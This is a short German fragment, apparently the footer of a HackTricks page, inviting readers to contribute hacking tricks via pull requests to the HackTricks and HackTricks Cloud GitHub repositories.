* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
